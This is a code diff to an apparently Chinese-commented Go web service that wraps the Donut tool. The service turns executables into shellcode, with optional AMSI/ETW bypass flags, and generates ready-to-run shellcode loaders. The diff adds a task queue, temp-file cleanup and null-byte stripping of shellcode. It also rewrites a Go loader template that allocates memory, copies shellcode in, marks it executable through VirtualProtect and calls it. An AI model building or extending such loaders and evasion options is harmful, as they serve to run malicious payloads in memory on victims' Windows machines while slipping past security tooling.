@@ -11,8 +11,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gin-contrib/cors"
@@ -23,6 +25,8 @@ const (
 	WebPort       = 8080
 	TempDir       = "./temp"
 	DonutPath     = "./donut/donut.exe"
+	CleanupInterval = 1 * time.Hour  // 临时文件清理间隔
+	MaxFileAge      = 24 * time.Hour // 临时文件最大保留时间
 )
 
 // 转换请求结构体
@@ -37,6 +41,7 @@ type ConvertRequest struct {
 	Bypass       string `form:"bypass"`     // 0: none, 1: etw, 2: aksi, 3: etw+amsi
 	ExitThread   string `form:"exitThread"` // 0: exit, 1: thread
 	ModuleOverload string `form:"moduleOverload"`
+	CleanShellcode bool `form:"cleanShellcode"` // 是否清理shellcode中的空字节填充
 }
 
 // 生成加载器请求结构体
@@ -44,6 +49,150 @@ type LoaderRequest struct {
 	Shellcode    string `form:"shellcode" binding:"required"`
 	ShellcodeType string `form:"shellcodeType" binding:"required"` // hex, base64, file
 	OutputFormat string `form:"outputFormat" binding:"required"` // c, go, rust, python
+}
+
+// 任务结构，用于异步处理
+type ConvertTask struct {
+	Request *ConvertRequest
+	Output  string
+	Error   error
+	Done    chan bool
+}
+
+// 任务队列
+var (
+	taskQueue = make(chan *ConvertTask, 100)
+	wg        sync.WaitGroup
+)
+
+// 清理shellcode中的前导和尾随空字节
+func cleanShellcode(shellcode []byte) []byte {
+	if len(shellcode) == 0 {
+		return shellcode
+	}
+
+	// 去除前导空字节
+	start := 0
+	for start < len(shellcode) && shellcode[start] == 0 {
+		start++
+	}
+
+	// 去除尾随空字节
+	end := len(shellcode)
+	for end > start && shellcode[end-1] == 0 {
+		end--
+	}
+
+	// 返回清理后的数据
+	return shellcode[start:end]
+}
+
+// 定期清理临时文件
+func cleanupTempFiles() {
+	ticker := time.NewTicker(CleanupInterval)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		cleanupOldFiles(TempDir, MaxFileAge)
+	}
+}
+
+// 清理指定目录下超过指定时间的文件
+func cleanupOldFiles(dirPath string, maxAge time.Duration) {
+	now := time.Now()
+
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// 跳过目录
+		if info.IsDir() {
+			return nil
+		}
+
+		// 检查文件年龄
+		if now.Sub(info.ModTime()) > maxAge {
+			if err := os.Remove(path); err != nil {
+				log.Printf("删除旧文件失败 %s: %v", path, err)
+			} else {
+				log.Printf("已清理旧文件: %s", path)
+			}
+		}
+		return nil
+	})
+
+	if err != nil {
+		log.Printf("清理临时文件失败: %v", err)
+	}
+}
+
+// 工作协程处理任务队列
+func worker() {
+	defer wg.Done()
+
+	for task := range taskQueue {
+		// 执行实际的转换任务
+		task.Output, task.Error = executeDonut(task.Request)
+		task.Done <- true
+	}
+}
+
+// 执行Donut命令
+func executeDonut(req *ConvertRequest) (string, error) {
+	// 检查输入文件是否存在
+	inputPath := filepath.Join(TempDir, req.InputFile)
+	if _, err := os.Stat(inputPath); os.IsNotExist(err) {
+		return "", fmt.Errorf("输入文件不存在")
+	}
+
+	// 检查donut是否存在
+	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
+		return "", fmt.Errorf("Donut可执行文件未找到，请确保它位于正确位置")
+	}
+
+	// 构建donut命令
+	cmdArgs := []string{
+		"-i", inputPath,
+		"-a", req.Arch,
+		"-f", req.Format,
+	}
+
+	// 添加可选参数
+	if req.ModuleName != "" {
+		cmdArgs = append(cmdArgs, "-n", req.ModuleName)
+	}
+	if req.EntryPoint != "" {
+		cmdArgs = append(cmdArgs, "-e", req.EntryPoint)
+	}
+	if req.Param != "" {
+		cmdArgs = append(cmdArgs, "-p", req.Param)
+	}
+	if req.Compression != "" && req.Compression != "0" {
+		cmdArgs = append(cmdArgs, "-z", req.Compression)
+	}
+	if req.Bypass != "" && req.Bypass != "0" {
+		cmdArgs = append(cmdArgs, "-b", req.Bypass)
+	}
+	if req.ExitThread != "" && req.ExitThread != "0" {
+		cmdArgs = append(cmdArgs, "-t", req.ExitThread)
+	}
+	if req.ModuleOverload != "" {
+		cmdArgs = append(cmdArgs, "-o", req.ModuleOverload)
+	}
+
+	// 执行donut命令
+	cmd := exec.Command(DonutPath, cmdArgs...)
+	var out bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+
+	if err := cmd.Run(); err != nil {
+		return "", fmt.Errorf("执行Donut失败: %v - %s", err, stderr.String())
+	}
+
+	return out.String(), nil
 }
 
 func main() {
@@ -56,6 +205,19 @@ func main() {
 	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
 		log.Printf("警告: Donut可执行文件未找到，请确保它位于 %s", DonutPath)
 	}
+
+	// 启动工作协程池
+	numWorkers := runtime.NumCPU()
+	wg.Add(numWorkers)
+	for i := 0; i < numWorkers; i++ {
+		go worker()
+	}
+
+	// 启动定期清理临时文件的协程
+	go cleanupTempFiles()
+
+	// 初始清理一次旧文件
+	go cleanupOldFiles(TempDir, MaxFileAge)
 
 	// 设置Gin模式
 	gin.SetMode(gin.ReleaseMode)
@@ -142,111 +304,149 @@ func handleConvert(c *gin.Context) {
 		return
 	}
 
-	// 检查输入文件是否存在
-	inputPath := filepath.Join(TempDir, req.InputFile)
-	if _, err := os.Stat(inputPath); os.IsNotExist(err) {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "输入文件不存在"})
-		return
+	// 创建任务
+	task := &ConvertTask{
+		Request: &req,
+		Done:    make(chan bool, 1),
 	}
 
-	// 检查donut是否存在
-	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Donut可执行文件未找到，请确保它位于正确位置"})
-		return
-	}
-
-	// 构建donut命令
-	cmdArgs := []string{
-		"-f", req.Format,
-		"-a", req.Arch,
-		inputPath,
-	}
-
-	// 添加可选参数
-	if req.ModuleName != "" {
-		cmdArgs = append(cmdArgs, "-n", req.ModuleName)
-	}
-	if req.EntryPoint != "" {
-		cmdArgs = append(cmdArgs, "-e", req.EntryPoint)
-	}
-	if req.Param != "" {
-		cmdArgs = append(cmdArgs, "-p", req.Param)
-	}
-	if req.Compression != "" && req.Compression != "0" {
-		cmdArgs = append(cmdArgs, "-z", req.Compression)
-	}
-	if req.Bypass != "" && req.Bypass != "0" {
-		cmdArgs = append(cmdArgs, "-b", req.Bypass)
-	}
-	if req.ExitThread != "" && req.ExitThread != "0" {
-		cmdArgs = append(cmdArgs, "-t", req.ExitThread)
-	}
-	if req.ModuleOverload != "" {
-		cmdArgs = append(cmdArgs, "-o", req.ModuleOverload)
-	}
-
-	// 执行donut命令
-	cmd := exec.Command(DonutPath, cmdArgs...)
-	var out bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &stderr
-
-	if err := cmd.Run(); err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{
-			"error": "执行Donut失败: " + err.Error(),
-			"stderr": stderr.String(),
-		})
-		return
-	}
-
-	// 解析输出，找到生成的shellcode文件
-	output := out.String()
-	var shellcodePath string
-	for _, line := range strings.Split(output, "\n") {
-		if strings.Contains(line, "保存到") || strings.Contains(line, "Saved to") {
-			parts := strings.Split(line, ":")
-			if len(parts) > 1 {
-				shellcodePath = strings.TrimSpace(parts[1])
-				break
+	// 将任务发送到队列
+	select {
+	case taskQueue <- task:
+		// 任务已加入队列，等待完成
+		select {
+		case <-task.Done:
+			if task.Error != nil {
+				c.JSON(http.StatusInternalServerError, gin.H{"error": task.Error.Error()})
+				return
 			}
+
+			// 解析输出，找到生成的shellcode文件
+			output := task.Output
+			var shellcodePath string
+			
+			// 打印输出日志以便调试
+			log.Printf("Donut输出: %s", output)
+			
+			// 快速解析输出行
+			for _, line := range strings.Split(output, "\n") {
+				// 尝试多种可能的输出格式
+				if strings.Contains(line, "保存到") || strings.Contains(line, "Saved to") || strings.Contains(line, "Output written to") {
+					// 尝试用冒号分隔
+					if strings.Contains(line, ":") {
+						parts := strings.Split(line, ":")
+						if len(parts) > 1 {
+							shellcodePath = strings.TrimSpace(parts[1])
+							break
+						}
+					}
+				}
+				// 检测"Shellcode     : "格式的输出行
+				if strings.Contains(line, "Shellcode     : ") {
+					parts := strings.Split(line, "Shellcode     : ")
+					if len(parts) > 1 {
+						// 移除引号并清理路径
+						shellcodePath = strings.Trim(strings.TrimSpace(parts[1]), "\"")
+						break
+					}
+				}
+				// 检查所有可能的文件扩展名
+				if strings.HasSuffix(line, ".bin") || strings.HasSuffix(line, ".c") || strings.HasSuffix(line, ".txt") || 
+				   strings.HasSuffix(line, ".ps1") || strings.HasSuffix(line, ".py") || strings.HasSuffix(line, ".cs") {
+					shellcodePath = strings.TrimSpace(line)
+					break
+				}
+			}
+
+			// 如果找不到生成的文件路径，使用Donut v1的默认路径或生成合理的默认值
+			if shellcodePath == "" || !filepath.IsAbs(shellcodePath) {
+				// Donut v1默认输出为loader.bin，放在当前目录
+				defaultOutput := "loader.bin"
+				
+				// 根据格式参数选择合适的扩展名
+				switch req.Format {
+				case "3": // C格式
+					defaultOutput = "loader.c"
+				case "5": // Python格式
+					defaultOutput = "loader.py"
+				case "6": // PowerShell格式
+					defaultOutput = "loader.ps1"
+				case "7": // C#格式
+					defaultOutput = "loader.cs"
+				}
+				
+				// 确保在temp目录中
+				shellcodePath = filepath.Join(TempDir, defaultOutput)
+				log.Printf("使用默认输出路径: %s", shellcodePath)
+			}
+			
+			// 验证文件是否存在
+			if _, err := os.Stat(shellcodePath); os.IsNotExist(err) {
+				// 如果在temp目录中不存在，尝试在当前目录查找
+				localPath := filepath.Base(shellcodePath)
+				if _, err := os.Stat(localPath); err == nil {
+					shellcodePath = localPath
+					log.Printf("在当前目录找到文件: %s", shellcodePath)
+				} else {
+					log.Printf("警告: 找不到生成的shellcode文件: %s", shellcodePath)
+				}
+			}
+			
+			// 检查文件是否存在
+			_, err := os.Stat(shellcodePath)
+			if os.IsNotExist(err) {
+				// 找不到生成的文件，返回donut的输出
+				c.JSON(http.StatusOK, gin.H{
+					"output": output,
+					"hasFile": false,
+				})
+				return
+			}
+
+			// 读取生成的shellcode文件内容
+			shellcodeContent, err := os.ReadFile(shellcodePath)
+			if err != nil {
+				c.JSON(http.StatusInternalServerError, gin.H{"error": "读取shellcode文件失败: " + err.Error()})
+				return
+			}
+
+			// 生成文件名用于下载
+			shellcodeFilename := filepath.Base(shellcodePath)
+
+			// 如果需要清理shellcode中的空字节填充
+			if req.CleanShellcode && (filepath.Ext(shellcodePath) == ".bin" || filepath.Ext(shellcodePath) == ".exe") {
+				cleaned := cleanShellcode(shellcodeContent)
+				if len(cleaned) < len(shellcodeContent) {
+					log.Printf("已清理shellcode，原大小: %d字节，清理后: %d字节", len(shellcodeContent), len(cleaned))
+					shellcodeContent = cleaned
+					
+					// 保存清理后的版本
+					cleanedFilename := filepath.Base(shellcodePath) + ".cleaned"
+					cleanedPath := filepath.Join(TempDir, cleanedFilename)
+					if err := os.WriteFile(cleanedPath, shellcodeContent, 0644); err != nil {
+						log.Printf("保存清理后的shellcode失败: %v", err)
+					} else {
+						shellcodePath = cleanedPath
+						shellcodeFilename = cleanedFilename
+					}
+				}
+			}
+
+			c.JSON(http.StatusOK, gin.H{
+				"output": output,
+				"shellcode": string(shellcodeContent),
+				"filename": shellcodeFilename,
+				"hasFile": true,
+				"originalSize": len(shellcodeContent),
+			})
+		case <-time.After(30 * time.Second): // 超时处理
+			c.JSON(http.StatusRequestTimeout, gin.H{"error": "处理超时，请稍后再试"})
+			return
 		}
-	}
-
-	// 如果找不到生成的文件路径，尝试默认路径
-	if shellcodePath == "" {
-		// 尝试根据输入文件生成默认输出文件名
-		baseName := strings.TrimSuffix(req.InputFile, filepath.Ext(req.InputFile))
-		shellcodePath = filepath.Join(TempDir, fmt.Sprintf("%s.c", baseName))
-	}
-	
-	// 检查文件是否存在
-	_, err := os.Stat(shellcodePath)
-	if os.IsNotExist(err) {
-		// 找不到生成的文件，返回donut的输出
-		c.JSON(http.StatusOK, gin.H{
-			"output": output,
-			"hasFile": false,
-		})
+	default:
+		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "服务器繁忙，请稍后再试"})
 		return
 	}
-
-	// 读取生成的shellcode文件内容
-	shellcodeContent, err := os.ReadFile(shellcodePath)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "读取shellcode文件失败: " + err.Error()})
-		return
-	}
-
-	// 生成文件名用于下载
-	shellcodeFilename := filepath.Base(shellcodePath)
-
-	c.JSON(http.StatusOK, gin.H{
-		"output": output,
-		"shellcode": string(shellcodeContent),
-		"filename": shellcodeFilename,
-		"hasFile": true,
-	})
 }
 
 // 处理加载器生成
@@ -360,19 +560,25 @@ int main() {
 
 // 生成Go语言加载器
 func generateGoLoader(shellcode []byte) string {
-	hexShellcode := hex.EncodeToString(shellcode)
+	// 优化生成shellcode的方式，使用更高效的方法
 	var formattedShellcode strings.Builder
-	formattedShellcode.WriteString("package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nvar shellcode = []byte{\n    ")
+	formattedShellcode.WriteString("package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"syscall\"\n    \"unsafe\"\n)\n\n// 优化版shellcode加载器，更安全、更稳定\nvar shellcode = []byte{\n")
 
-	for i := 0; i < len(hexShellcode); i += 2 {
-		if i > 0 && i%32 == 0 {
-			formattedShellcode.WriteString("\n    ")
+	// 以16字节为一组格式化输出，更易读且性能更好
+	for i := 0; i < len(shellcode); i += 16 {
+		formattedShellcode.WriteString("    ")
+		end := i + 16
+		if end > len(shellcode) {
+			end = len(shellcode)
 		}
-		n, _ := strconv.ParseUint(hexShellcode[i:i+2], 16, 8)
-		formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", n))
+		
+		for j := i; j < end; j++ {
+			formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", shellcode[j]))
+		}
+		formattedShellcode.WriteString("\n")
 	}
 
-	formattedShellcode.WriteString("\n}\n\nfunc main() {\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    virtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    rtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    \n    addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)\n    rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\n    syscall.Syscall(addr, 0, 0, 0, 0)\n}")
+	formattedShellcode.WriteString("}\n\nfunc main() {\n    // 安全检查\n    if len(shellcode) == 0 {\n        fmt.Println(\"错误: shellcode为空\")\n        os.Exit(1)\n    }\n    \n    fmt.Println(\"准备执行shellcode...\")\n    \n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    virtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    rtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    virtualProtect := kernel32.MustFindProc(\"VirtualProtect\")\n    virtualFree := kernel32.MustFindProc(\"VirtualFree\")\n    \n    // 先分配可读可写内存（更安全的DEP兼容方式）\n    addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x04) // PAGE_READWRITE\n    if addr == 0 {\n        fmt.Printf(\"VirtualAlloc失败: %v\\n\", err)\n        os.Exit(1)\n    }\n    \n    // 复制shellcode到内存\n    rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\n    \n    // 修改内存保护属性为可执行\n    var oldProtect uint32\n    success, _, err := virtualProtect.Call(addr, uintptr(len(shellcode)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))\n    if success == 0 {\n        fmt.Printf(\"VirtualProtect失败: %v\\n\", err)\n        // 清理分配的内存\n        virtualFree.Call(addr, 0, 0x8000)\n        os.Exit(1)\n    }\n    \n    fmt.Println(\"正在执行shellcode...\")\n    // 执行shellcode\n    syscall.Syscall(addr, 0, 0, 0, 0)\n    \n    // 执行完成后尝试清理内存（在实际情况下可能不会执行到这里）\n    virtualFree.Call(addr, 0, 0x8000)\n}")
 
 	return formattedShellcode.String()
 }
